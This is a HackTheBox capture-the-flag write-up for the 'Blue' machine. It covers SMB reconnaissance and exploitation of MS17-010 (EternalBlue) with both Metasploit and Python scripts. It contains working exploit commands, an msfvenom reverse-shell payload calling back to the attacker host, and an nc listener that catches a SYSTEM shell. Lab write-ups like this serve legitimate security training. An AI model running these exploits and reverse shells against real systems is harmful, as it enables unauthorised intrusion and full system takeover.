---
title: HTB: Blue
url: https://0xdf.gitlab.io/2021/05/11/htb-blue.html
date: 2021-05-11T09:00:00+00:00
difficulty: Easy [20]
os: Windows
tags: htb-blue, hackthebox, ctf, nmap, nmap-scripts, smbmap, smbclient, metasploit, ms17-010, eternalblue, meterpreter, impacket, virtualenv, oscp-like-v2, oscp-like-v1
---

![Blue](https://0xdfimages.gitlab.io/img/blue-cover.png)

Blue was the first box I owned on HTB, on 8 November 2017. And it really is one of the easiest boxes on the platform. The root first blood went in two minutes. You just point the exploit for MS17-010 (aka ETERNALBLUE) at the machine and get a shell as System. I’ll show how to find the machine is vulnerable to MS17-010 using Nmap, and how to exploit it with both Metasploit and using Python scripts.

## Box Info

| Name | [Blue](https://hackthebox.com/machines/blue)  [Blue](https://hackthebox.com/machines/blue) [Play on HackTheBox](https://hackthebox.com/machines/blue) |
| --- | --- |
| Release Date | [28 Jul 2017](https://twitter.com/hackthebox_eu/status/1318841696990486529) |
| Retire Date | 13 Jan 2018 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Blue |
| Radar Graph | Radar chart for Blue |
| First Blood User | 00:02:34[stefano118 stefano118](https://app.hackthebox.com/users/3603) |
| First Blood Root | 00:02:01[stefano118 stefano118](https://app.hackthebox.com/users/3603) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` found three standard Windows ports in RPC (135), NetBios (139), and SMB (445), as well as some high RPC associated ports in the 49000s:

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.40
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 21:00 EDT
Warning: 10.10.10.40 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.40
Host is up (0.021s latency).
Not shown: 65517 closed ports
PORT      STATE    SERVICE
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds

oxdf@parrot$ nmap -p 135,139,445 -sCV -oA scans/nmap-tcpscripts 10.10.10.40
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 21:01 EDT
Nmap scan report for 10.10.10.40
Host is up (0.018s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -17m06s, deviation: 34m38s, median: 2m53s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-04T02:04:49+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-04T01:04:52
|_  start_date: 2021-05-04T00:54:47

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.74 seconds

```

The SMB output says this is Windows 7 Professional.

### SMB - TCP 445

#### Shares

There are a couple shares with null session read access (the trick of giving `smbmap` wrong creds works here):

```

oxdf@parrot$ smbmap -H 10.10.10.40
[+] IP: 10.10.10.40:445 Name: 10.10.10.40                                       
oxdf@parrot$ smbmap -H 10.10.10.40 -u "0xdf -p "0xdf
[+] Guest session       IP: 10.10.10.40:445     Name: 10.10.10.40                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Share                                                   READ ONLY
        Users                                                   READ ONLY

```

`Share` is empty:

```

oxdf@parrot$ smbclient //10.10.10.40/share
Enter WORKGROUP\oxdf's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 14 09:48:44 2017
  ..                                  D        0  Fri Jul 14 09:48:44 2017

                8362495 blocks of size 4096. 4259398 blocks available

```

`Users` has just empty `Default` and `Public` folders:

```

oxdf@parrot$ smbclient //10.10.10.40/users
Enter WORKGROUP\oxdf's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul 21 02:56:23 2017
  ..                                 DR        0  Fri Jul 21 02:56:23 2017
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Public                             DR        0  Tue Apr 12 03:51:29 2011

                8362495 blocks of size 4096. 4259398 blocks available
smb: \> ls default
  Default                           DHR        0  Tue Jul 14 03:07:31 2009

                8362495 blocks of size 4096. 4259398 blocks available
smb: \> ls public
  Public                             DR        0  Tue Apr 12 03:51:29 2011

                8362495 blocks of size 4096. 4259398 blocks available

```

#### Vulns

`nmap` has `vuln` scripts that will check for known vulnerabilities in service. I’ll run them here, and it finds a big one, MS-17-010:

```

oxdf@parrot$ nmap -p 445 -script vuln -oA scans/nmap-smbvulns 10.10.10.40 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 21:17 EDT
Nmap scan report for 10.10.10.40
Host is up (0.019s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 24.85 seconds

```

## Shell as System

### Background

MS-17-010, otherwise known as ETERNALBLUE, is a unauthenticated remote code execution vulnerability in Windows SMB most famous for it’s leak by the [Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers) and for driving the [WannaCry](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack) worm in May 2017.

The exploits in Metasploit for MS17-010 are much more stable than the Python script counterparts. If you’re doing this in the real world, I’d strongly recommend using Metasploit here. If you’re doing this for some kind of training activity that doesn’t allow Metasploit (like OSCP), then the downside of crashing a few boxes acceptable. I’ll show both.

### Metasploit

The easiest way to pull this off is with Metasploit. I’ll start it with `msfconsole`, and then search for `MS17-010`:

```

msf6 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description        
   -  ----                                           ---------------  ----     -----  -----------        
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce

```

`4` is a scanner, and `5` is using a backdoor that must already be on the system, so they are out. `1` is specifically for Win8, which is not this system. `3` is auxiliary, though it says command execution, so I don’t want to rule it out, but I’ll put it last. That leaves `0` and `2`.

I’ll try `0`:

```

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >

```

I’ll set the target and my local IP, and the rest of the options look good:

```

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.14
lhost => 10.10.14.14
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.10.40      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.14      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs

```

Running it returns a shell as SYSTEM:

```

msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.14:4444 
[*] 10.10.10.40:445 - Executing automatic check (disable AutoCheck to override)
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.10.10.40
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.40:49173) at 2021-05-03 21:32:51 -0400

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM

```

I find it easier to work out of a real shell since I don’t use Meterpreter very often:

```

meterpreter > shell
Process 2220 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

```

Now just grab the flags:

```

C:\Windows\system32>cd \users   

C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  17,256,050,688 bytes free

C:\Users>type administrator\desktop\root.txt
ff548eb7************************
C:\Users>type haris\desktop\user.txt
4c546aea************************

```

### Python Script

In coming back to write this post, I wasn’t able to find a Python3 script to do MS17-010. This led to a bit of a tough spot, as my VM was configured to use [Impacket](https://github.com/SecureAuthCorp/impacket) with Python3.

#### Create Virtual Environment

I created a virtual environment that would use Python2 with Impacket. First I cloned Impacket into `/opt`:

```

oxdf@parrot$ git clone https://github.com/SecureAuthCorp/impacket.git                               
Cloning into 'impacket'...
remote: Enumerating objects: 19128, done.
remote: Counting objects: 100% (247/247), done.
remote: Compressing objects: 100% (139/139), done.
remote: Total 19128 (delta 135), reused 187 (delta 107), pack-reused 18881
Receiving objects: 100% (19128/19128), 6.56 MiB | 10.85 MiB/s, done.
Resolving deltas: 100% (14511/14511), done.

```

In Python3, there’s a builtin `venv` module for creating virtual environment. But for Python2, I need to `apt install virtualenv`. Now I’ll create that environment folder in the Impacket directory using the `-p` flag to tell it I want Python2:

```

oxdf@parrot$ cd impacket
oxdf@parrot$ virtualenv impacket-venv -p $(which python2)
created virtual environment CPython2.7.18.final.0-64 in 650ms
  creator CPython2Posix(dest=/opt/impacket/impacket-venv, clear=False, no_vcs_ignore=False, global=False) 
  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/oxdf/.local/share/virtualenv)
    added seed packages: pip==20.3.4, setuptools==44.1.1, wheel==0.36.2
  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator

```

Now when I activate it, I get the updated prompt, and `python` is `python2.7`:

```

oxdf@parrot$ source impacket-venv/bin/activate
(impacket-venv) oxdf@parrot$ python -V
Python 2.7.18

```

I’ll install `pip`:

```

(impacket-venv) oxdf@parrot$ wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
...[snip]...
(impacket-venv) oxdf@parrot$ python get-pip.py
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details
 about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Collecting pip<21.0
  Using cached pip-20.3.4-py2.py3-none-any.whl (1.5 MB)
Installing collected packages: pip
  Attempting uninstall: pip
    Found existing installation: pip 20.3.4
    Uninstalling pip-20.3.4:
      Successfully uninstalled pip-20.3.4
Successfully installed pip-20.3.4

```

Now finally install Impacket:

```

(impacket-venv) oxdf@parrot$ pip install -r requirements.txt
...[snip]...
(impacket-venv) oxdf@parrot$ pip install .
...[snip]...

```

#### Script Analysis

The best MS17-010 Python scripts I know of are from [worawit](https://github.com/worawit/MS17-010). These work well, but are a bit confusing to use. [helviojunior](https://github.com/helviojunior/MS17-010) forked that repo and added a single `send_and_execute.py`, which is really handy. It’s simply an update of the `zzz_exploit.py` script from the original, but it is modified to upload a file and execute it as system.

In `zzz_exploit.py`, there’s a function, `smb_pwn`:

```

def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()
	
	print('creating file c:\\pwned.txt on the target')
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)
	
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
	# Note: there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."

```

This is the action taken with the exploit. In this case, without mod, it’s creating `C:\pwned.txt` on the target. But the commented out lines show how the functions in this file can be used to also upload to the target (`smb_send_file`) and execute as a service (`service_exec`).

The updated `send_and_execute.py` adds some handling of command line args, and then this function:

```

def send_and_execute(conn, arch):
	smbConn = conn.get_smbconnection()

	filename = "%s.exe" % random_generator(6)
	print "Sending file %s..." % filename

    #In some cases you should change remote file location
    #For example:
    #smb_send_file(smbConn, lfile, 'C', '/windows/temp/%s' % filename)
	#service_exec(conn, r'cmd /c c:\windows\temp\%s' % filename)    
	
	smb_send_file(smbConn, lfile, 'C', '/%s' % filename)
	service_exec(conn, r'cmd /c c:\%s' % filename)

```

It’s very similar to what’s going on in the original, but it’s updated to upload `lfile` to `C:\filename` and then run it.

You can either modify `zzz_exploit.py`, use `send_and_execute.py`, or make your own script using the functions from that repo.

#### Cred Update

Just like with `smbmap` above, when I try to run this with username as an empty string, it won’t auth. However, if I just add any string into the username, it will then work.

When I was doing OSCP (2.5 years ago now), there were many boxes that would fall to this script with blank creds. I believe it should act similar to what you see with `smbmap`. But just like there, it’s always better to try both with and without bad creds if you aren’t sure (and of course if you have good creds, then use those!).

#### Shell

I’ll generate a payload with `msfvenom`:

```

oxdf@parrot$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: rev.exe

```

While x64 is relatively universal for Windows systems today, in 2017 when this box was released, x86 was much more common, especially in Windows 7.

`shell_reverse_tcp` is a raw command shell (non-meterpreter), and it is not staged (which is to say the entire payload is in that one exe, instead of just a stub that will connect back and get the rest). With both of those, I can just catch the shell with `nc`. If I wanted a staged payload, I would have done `shell/reverse_tcp`.

With the username updated to “0xdf”, I’ll start `nc`, and run `send_and_execute.py`:

```

(impacket-venv) oxdf@parrot$ python send_and_execute.py 10.10.10.40 rev.exe 
Trying to connect to 10.10.10.40:445
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: browser
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8001c3d8f0
SESSION: 0xfffff8a0019ee2a0
FLINK: 0xfffff8a00264f048
InParam: 0xfffff8a00283a15c
MID: 0xd07
unexpected alignment, diff: 0x-1ebfb8
leak failed... try again
CONNECTION: 0xfffffa8001c3d8f0
SESSION: 0xfffff8a0019ee2a0
FLINK: 0xfffff8a002850088
InParam: 0xfffff8a00284a15c
MID: 0xe03
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Sending file BI8O95.exe...
Opening SVCManager on 10.10.10.40.....
Creating service mIfk.....
Starting service mIfk.....
The NETBIOS connection with the remote host timed out.
Removing service mIfk.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done

```

At the line sixth from the end, where it says “Starting Service”, I get a connection at `nc`:

```

oxdf@parrot$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.40] 49162
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```